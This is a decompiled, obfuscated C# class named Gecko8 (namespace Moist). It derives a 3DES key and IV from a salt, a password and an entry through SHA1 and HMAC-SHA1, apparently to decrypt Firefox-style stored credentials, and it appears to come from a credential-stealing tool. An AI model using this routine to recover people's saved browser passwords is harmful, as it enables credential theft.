using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace Moist
{
	// Token: 0x02000034 RID: 52
	public class Gecko8
	{
		// Token: 0x06000100 RID: 256 RVA: 0x00004977 File Offset: 0x00002B77
		[CompilerGenerated]
		private byte[] method_0()
		{
			return this.JfsuJlrbjB;
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000497F File Offset: 0x00002B7F
		[CompilerGenerated]
		private byte[] method_1()
		{
			return this.byte_0;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00004987 File Offset: 0x00002B87
		[CompilerGenerated]
		private byte[] method_2()
		{
			return this.byte_1;
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000103 RID: 259 RVA: 0x0000498F File Offset: 0x00002B8F
		// (set) Token: 0x06000104 RID: 260 RVA: 0x00004997 File Offset: 0x00002B97
		public byte[] DataKey { get; private set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000105 RID: 261 RVA: 0x000049A0 File Offset: 0x00002BA0
		// (set) Token: 0x06000106 RID: 262 RVA: 0x000049A8 File Offset: 0x00002BA8
		public byte[] DataIV { get; private set; }

		// Token: 0x06000107 RID: 263 RVA: 0x000049B1 File Offset: 0x00002BB1
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			Class40.gcO0h7LzslQIW();
			base..ctor();
			this.JfsuJlrbjB = salt;
			this.byte_0 = password;
			this.byte_1 = entry;
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000B580 File Offset: 0x00009780
		public void method_3()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this.method_0().Length + this.method_1().Length];
			Array.Copy(this.method_0(), 0, array, 0, this.method_0().Length);
			Array.Copy(this.method_1(), 0, array, this.method_0().Length, this.method_1().Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.method_2().Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this.method_2(), 0, array3, array2.Length, this.method_2().Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.method_2(), 0, array4, 0, this.method_2().Length);
			for (int i = this.method_2().Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.method_2().Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.method_2(), 0, array5, array4.Length, this.method_2().Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.method_2().Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this.method_2(), 0, array8, array7.Length, this.method_2().Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}

		// Token: 0x040000A9 RID: 169
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private readonly byte[] JfsuJlrbjB;

		// Token: 0x040000AA RID: 170
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private readonly byte[] byte_0;

		// Token: 0x040000AB RID: 171
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private readonly byte[] byte_1;

		// Token: 0x040000AC RID: 172
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private byte[] byte_2;

		// Token: 0x040000AD RID: 173
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private byte[] mIaumqyWdf;
	}
}
